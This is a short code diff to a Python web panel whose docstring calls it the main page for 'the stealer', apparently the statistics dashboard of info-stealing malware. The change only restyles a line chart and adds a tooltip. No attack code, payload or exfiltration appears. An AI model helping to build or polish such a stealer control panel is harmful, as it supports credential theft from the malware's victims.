@@ -4,7 +4,7 @@ from panel.ui.handlers.stats_handler import StatisticsHandler
 
 
 async def fr_page() -> None:
-    """Main page for the stealer. Very simple."""
+    """Main page for the stealer. Now includes a cool chart!"""
 
     stat_handler = StatisticsHandler()
 
@@ -12,10 +12,15 @@ async def fr_page() -> None:
     dates = [item[0] for item in data]
     values = [item[1] for item in data]
 
-    ui.echart(
+    chart = ui.echart(
         {
             "xAxis": {"type": "category", "data": dates},
             "yAxis": {"type": "value"},
             "series": [{"type": "line", "data": values, "smooth": True}],
         }
-    ).classes("m-4 w-full h-full")
+    ).classes("w-full h-full")
+
+    chart.run_chart_method(
+        ":setOption",
+        r'{tooltip: {formatter: params => "" + params.value}}',
+    )
